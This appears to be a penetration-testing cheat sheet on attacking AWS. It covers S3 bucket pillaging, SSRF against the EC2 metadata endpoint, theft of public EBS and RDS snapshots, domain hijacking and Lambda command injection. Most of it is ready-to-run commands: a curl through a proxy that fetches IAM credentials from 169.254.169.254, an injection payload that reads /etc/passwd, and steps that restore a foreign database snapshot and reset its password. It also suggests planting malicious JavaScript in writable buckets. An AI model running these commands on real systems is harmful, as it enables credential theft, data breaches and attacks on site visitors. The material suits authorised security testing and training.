# AWS

## AWS basic info

```text
Auth methods:
• Programmatic access - Access + Secret Key
   ◇ Secret Access Key and Access Key ID for authenticating via scripts and CLI
• Management Console Access
   ◇ Web Portal Access to AWS

Recon:
• AWS Usage
   ◇ Some web applications may pull content directly from S3 buckets
   ◇ Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
   ◇ Burp Suite
   ◇ Navigate application like you normally would and then check for any requests to:
      ▪ https://[bucketname].s3.amazonaws.com
      ▪ https://s3-[region].amazonaws.com/[OrgName]

S3:
• Amazon Simple Storage Service (S3)
   ◇ Storage service that is “secure by default”
   ◇ Configuration issues tend to unsecure buckets by making them publicly accessible
   ◇ Nslookup can help reveal region
   ◇ S3 URL Format:
      ▪ https://[bucketname].s3.amazonaws.com
      ▪ https://s3-[region].amazonaws.com/[Org Name]
        # aws s3 ls s3://bucket-name-here --region 
        # aws s3api get-bucket-acl --bucket bucket-name-here
        # aws s3 cp readme.txt  s3://bucket-name-here --profile newuserprofile

EBS Volumes:
• Elastic Block Store (EBS)
• AWS virtual hard disks
• Can have similar issues to S3 being publicly available
• Difficult to target specific org but can find widespread leaks

EC2:
• Like virtual machines
• SSH keys created when started, RDP for Windows.
• Security groups to handle open ports and allowed IPs.

AWS Instance Metadata URL
• Cloud servers hosted on services like EC2 needed a way to orient themselves because of how dynamic they are
• A “Metadata” endpoint was created and hosted on a non-routable IP address at 169.254.169.254
• Can contain access/secret keys to AWS and IAM credentials
• This should only be reachable from the localhost
• Server compromise or SSRF vulnerabilities might allow remote attackers to reach it
• IAM credentials can be stored here:
   ◇ http://169.254.169.254/latest/meta-data/iam/security-credentials/
• Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
   ◇ curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
• CapitalOne Hack
   ◇ Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data.
• AWS EC2 Instance Metadata service Version 2 (IMDSv2)
• Updated in November 2019 – Both v1 and v2 are available
• Supposed to defend the metadata service against SSRF and reverse proxy vulns
• Added session auth to requests
• First, a “PUT” request is sent and then responded to with a token
• Then, that token can be used to query data
--
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
--

Post-compromise
• What do our access keys give us access to?
• Check AIO tools to do some recon (WeirdAAL- recon_module, PACU privesc,...)

### **S3 examples attacks**

```text
# S3 Bucket Pillaging

• GOAL: Locate Amazon S3 buckets and search them for interesting data
• In this lab you will attempt to identify a publicly accessible S3 bucket hosted by an organization. After identifying it you will list out the contents of it and download the files hosted there.

~$ sudo apt-get install python3-pip
~$ git clone https://github.com/RhinoSecurityLabs/pacu
~$ cd pacu
~$ sudo bash install.sh
~$ sudo aws configure
~$ sudo python3 pacu.py

Pacu > import_keys --all
# Search by domain
Pacu > run s3__bucket_finder -d glitchcloud 
# List files in bucket
Pacu > aws s3 ls s3://glitchcloud
# Download files
Pacu > aws s3 sync s3://glitchcloud s3-files-dir

# S3 Code Injection
• Backdoor JavaScript in S3 Buckets used by webapps 
• In March, 2018 a crypto-miner malware was found to be loading on MSN’s homepage
• This was due to AOL’s advertising platform having a writeable S3 bucket, which was being served by MSN
• If a webapp is loading content from an S3 bucket made publicly writeable attackers can upload  malicious JS to get executed by visitors 
• Can perform XSS-type attacks against webapp visitors
• Hook browser with Beef

# Domain Hijacking
• Hijack S3 domain by finding references in a webapp to S3 buckets that don’t exist anymore
• Or… subdomains that were linked to an S3 bucket with CNAME’s that still exist
• When assessing webapps look for 404’s to *.s3.amazonaws.com
• When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error 
• Go create the S3 bucket with the same name and region 
• Load malicious content to the new S3 bucket that will be executed when visitors hit the site
```

### Enumerate read access buckets script

```bash
#!/bin/bash
for i in "$@" ; do
 if [[ $i == "--profile" ]] ; then
            profile=$(echo "$@" | awk '{for(i=1;i<=NF;i++) if ($i=="--profile") print $(i+1)}')
            AWS_ACCESS_KEY_ID=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | head -n 1)
            AWS_SECRET_ACCESS_KEY=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | tail -n 1)
            break
        fi
done
echo "Enumerating the buckets..."
    aws --profile "$profile" s3 ls | cut -d ' ' -f 3 > /tmp/buckets
echo "You can read the following buckets:"
    >/tmp/readBuckets
for i in $(cat /tmp/buckets); do
    result=$(aws --profile "$profile" s3 ls s3://"$i" 2>/dev/null | head -n 1)
    if [ ! -z "$result" ]; then
            echo "$i" | tee /tmp/readBuckets
                    unset result
    fi
done
```

## EBS

### Find secrets in public EBS

```text
# Dufflebag https://github.com/bishopfox/dufflebag
```

### **EBS attack example**

```text
# Discover EBS Snapshot and mount it to navigate
- Obtaning public snapshot name
aws ec2 describe-snapshots --region us-east-1 --restorable-by-user-ids all | grep -C 10 "company secrets"
- Obtaining zone and instance
aws ec2 describe-instances --filters Name=tag:Name,Values=attacker-machine
- Create a new volume of it
aws ec2 create-volume --snapshot-id snap-03616657ede4b9862 --availability-zone <ZONE-HERE>
- Attach to an EC2 instance
aws ec2 attach-volume --device /dev/sdh --instance-id <INSTANCE-ID> --volume-id <VOLUME-ID>
    - It takes some time, to see the status:
    aws ec2 describe-volumes --filters Name=volume-id,Values=<VOLUME-ID>
- Once is mounted in EC2 instance, check it, mount it and access it:
sudo lsblk
sudo mount /dev/xvdh1 /mnt
cd /mnt/home/user/companydata
```

## **EC2**

### **EC2 basic commands**

```text
# Like traditional host
- Port enumeration
- Attack interesting services like ssh or rdp

aws ec2 describe-instances
aws ec2 describe-snapshots
aws ec2 describe-security-groups --group-ids <VPC Security Group ID> --region <region>
aws ec2 create-volume --snapshot-id snap-123123123

# SSH into created instance:
ssh -i ".ssh/key.pem" <user>@<instance-ip>
sudo mount /dev/xvdb1 /mnt
cat /mnt/home/ubuntu/setupNginx.sh
```

### **EC2 example attacks**

## Cloudfront

### Info

```text
Cloudfront is a CDN and it checks the HOST header in CNAMES, so:
- The domain "test.disloops.com" is a CNAME record that points to "disloops.com".
- The "disloops.com" domain is set up to use a CloudFront distribution.
- Because "test.disloops.com" was not added to the "Alternate Domain Names (CNAMEs)" field for the distribution, requests to "test.disloops.com" will fail.
- Another user can create a CloudFront distribution and add "test.disloops.com" to the "Alternate Domain Names (CNAMEs)" field to hijack the domain.
```

### Tools

```text
# https://github.com/MindPointGroup/cloudfrunt
git clone --recursive https://github.com/MindPointGroup/cloudfrunt
pip install -r requirements.txt
python cloudfrunt.py -o cloudfrunt.com.s3-website-us-east-1.amazonaws.com -i S3-cloudfrunt -l list.txt
```

## **AWS Lambda**

### **Info**

```text
# Welcome to serverless!!!!
# AWS Lambda, essentially are short lived servers that run your function and provide you with output that can be then used in other applications or consumed by other endpoints.

# OS command Injection in Lambda
curl "https://API-endpoint/api/stringhere"
# For a md5 converter endpoint "https://API-endpoint/api/hello;id;w;cat%20%2fetc%2fpasswd"
aws lambda list-functions --profile stolen
aws lambda get-function --function-name <FUNCTION-NAME> --profile stolen

## **AWS Inspector**

```text
# Amazon Inspector is an automated security assessment service that helps improve the security and compliance of applications deployed on AWS.
```

## **AWS RDS \(DB\) attacks**

```text
# Just like a MySQL, try for sqli!
# Check if 3306 is exposed
# Sqlmap is your friend ;)

# Stealing RDS Snapshots
- Searching partial snapshots
aws rds describe-db-snapshots --include-public --snapshot-type public --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup
- Restore in instance
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier recoverdb --publicly-accessible --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup --availability-zone us-east-1b
- Once restored, try to access
aws rds describe-db-instances --db-instance-identifier recoverdb
- Reset the master credentials
aws rds modify-db-instance --db-instance-identifier recoverdb --master-user-password NewPassword1 --apply-immediately
    - Takes some time, you can check the status:
    aws rds describe-db-instances
- Try to access it from EC2 instance which was restored
nc rds-endpoint 3306 -zvv    
- If you can't see, you may open 3306:
    - In RDS console, click on the recoverdb instance
    - Click on the Security Group
    - Add an Inbound rule for port 3306 TCP for Cloudhacker IP
 - Then connect it
 mysql -u <username> -p -h <rds-instance-endpoint>
```

## Aws Services Summary

| AWS Service | Should have been called | Use this to | It's like |
| :--- | :--- | :--- | :--- |
| EC2 | Amazon Virtual Servers | Host the bits of things you think of as a computer. | It's handwavy, but EC2 instances are similar to the virtual private servers you'd get at Linode, DigitalOcean or Rackspace. |
| IAM | Users, Keys and Certs | Set up additional users, set up new AWS Keys and policies. |  |
| S3 | Amazon Unlimited FTP Server | Store images and other assets for websites. Keep backups and share files between services. Host static websites. Also, many of the other AWS services write and read from S3. |  |
| VPC | Amazon Virtual Colocated Rack | Overcome objections that "all our stuff is on the internet!" by adding an additional layer of security. Makes it appear as if all of your AWS services are on the same little network instead of being small pieces in a much bigger network. | If you're familar with networking: VLANs |
| Lambda | AWS App Scripts | Run little self contained snippets of JS, Java or Python to do discrete tasks. Sort of a combination of a queue and execution in one. Used for storing and then executing changes to your AWS setup or responding to events in S3 or DynamoDB. |  |
| API Gateway | API Proxy | Proxy your apps API through this so you can throttle bad client traffic, test new versions, and present methods more cleanly. | 3Scale |
| RDS | Amazon SQL | Be your app's Mysql, Postgres, and Oracle database. | Heroku Postgres |
| Route53 | Amazon DNS + Domains | Buy a new domain and set up the DNS records for that domain. | DNSimple, GoDaddy, Gandi |
| SES | Amazon Transactional Email | Send one-off emails like password resets, notifications, etc. You could use it to send a newsletter if you wrote all the code, but that's not a great idea. | SendGrid, Mandrill, Postmark |
| Cloudfront | Amazon CDN | Make your websites load faster by spreading out static file delivery to be closer to where your users are. | MaxCDN, Akamai |
| CloudSearch | Amazon Fulltext Search | Pull in data on S3 or in RDS and then search it for every instance of 'Jimmy.' | Sphinx, Solr, ElasticSearch |
| DynamoDB | Amazon NoSQL | Be your app's massively scalable key valueish store. | MongoLab |
| Elasticache | Amazon Memcached | Be your app's Memcached or Redis. | Redis to Go, Memcachier |
| Elastic Transcoder | Amazon Beginning Cut Pro | Deal with video weirdness \(change formats, compress, etc.\). |  |
| SQS | Amazon Queue | Store data for future processing in a queue. The lingo for this is storing "messages" but it doesn't have anything to do with email or SMS. SQS doesn't have any logic, it's just a place to put things and take things out. | RabbitMQ, Sidekiq |
| WAF | AWS Firewall | Block bad requests to Cloudfront protected sites \(aka stop people trying 10,000 passwords against /wp-admin\) | Sophos, Kapersky |
